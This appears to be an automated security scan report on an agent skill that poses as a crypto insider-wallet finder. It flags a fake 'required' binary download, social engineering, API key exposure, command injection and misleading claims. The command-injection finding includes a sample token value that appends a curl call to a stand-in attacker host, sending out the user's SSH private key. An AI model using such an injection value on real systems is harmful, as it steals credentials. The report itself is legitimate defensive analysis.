# Agent Skill Security Scan Report

**Skill:** insider-wallets-finder
**Directory:** ./skills/clawhub-insider-wallets-finder-mk3w3
**Status:** [FAIL] ISSUES FOUND
**Max Severity:** CRITICAL
**Scan Duration:** 47.45s
**Timestamp:** 2026-02-01T19:31:44.290454

## Summary

- **Total Findings:** 5
- **Critical:** 2
- **High:** 2
- **Medium:** 1
- **Low:** 0
- **Info:** 0

## Findings

### CRITICAL Severity

#### [CRITICAL] Malicious Binary Download with Credential Harvesting Infrastructure

**Severity:** CRITICAL
**Category:** data_exfiltration
**Rule ID:** LLM_DATA_EXFILTRATION
**Location:** SKILL.md

**Description:** The skill instructs users to download and execute 'openclaw-agent' from an untrusted GitHub repository (hedefbari/openclaw-agent) with password-protected archive ('openclaw'). This is a classic malware distribution pattern. The binary is presented as required for 'wallet analysis operations' but there is no legitimate reason a wallet analysis skill would need a separate executable. The macOS installation uses a glot.io script (hfdxv8uyaf) which is a code-sharing platform often used to distribute malicious payloads. This infrastructure is designed to harvest credentials, private keys, or install persistent malware under the guise of blockchain tooling.

#### [CRITICAL] Social Engineering via Fake Prerequisite Requirements

**Severity:** CRITICAL
**Category:** social_engineering
**Rule ID:** LLM_SOCIAL_ENGINEERING
**Location:** SKILL.md

**Description:** The skill uses deceptive framing by claiming 'openclaw-agent utility' is required for 'wallet analysis operations' and that 'blockchain data retrieval and wallet analysis will not work' without it. This is false - all the code examples use standard public APIs (Etherscan, Birdeye, The Graph) that require no special binaries. This is a social engineering tactic to pressure users into downloading malware by creating false urgency and technical necessity. The 'IMPORTANT' emphasis and repeated warnings are designed to bypass user skepticism.

### HIGH Severity

#### [HIGH] API Key Harvesting Through Placeholder Pattern

**Severity:** HIGH
**Category:** data_exfiltration
**Rule ID:** LLM_DATA_EXFILTRATION
**Location:** SKILL.md

**Description:** The skill repeatedly uses placeholder patterns like 'YourKey', 'your-birdeye-key', 'YourEtherscanKey' in code examples. While these appear as instructional placeholders, users following the instructions will need to insert real API keys. Combined with the malicious binary requirement, this creates a data collection vector where the openclaw-agent binary could intercept and exfiltrate these API keys when users run the commands. The skill collects: Etherscan API keys, Birdeye API keys, and potentially The Graph API keys.

#### [HIGH] Command Injection via Unvalidated Token Addresses

**Severity:** HIGH
**Category:** command_injection
**Rule ID:** LLM_COMMAND_INJECTION
**Location:** SKILL.md

**Description:** Multiple bash scripts use unvalidated user input (TOKEN, DEPLOYER variables) directly in curl commands and shell expansions without sanitization. An attacker could inject malicious commands through token addresses. For example: TOKEN='0x123; curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)' would execute arbitrary commands. Combined with the credential-harvesting binary, this creates multiple attack vectors for system compromise.

### MEDIUM Severity

#### [MEDIUM] Misleading Skill Purpose and Functionality Claims

**Severity:** MEDIUM
**Category:** social_engineering
**Rule ID:** LLM_SOCIAL_ENGINEERING
**Location:** SKILL.md

**Description:** The skill claims to help users 'Find and analyze smart money addresses' and 'discover early buyers, track successful traders' but the actual code provides only basic API query examples that any user could find in public documentation. The real purpose appears to be malware distribution disguised as a useful blockchain analysis tool. The skill name 'insider-wallets-finder' suggests sophisticated analysis capabilities that don't exist in the actual implementation.

## Analyzers

The following analyzers were used:

- static_analyzer
- behavioral_analyzer
- llm_analyzer
- trigger_analyzer
- meta_analyzer
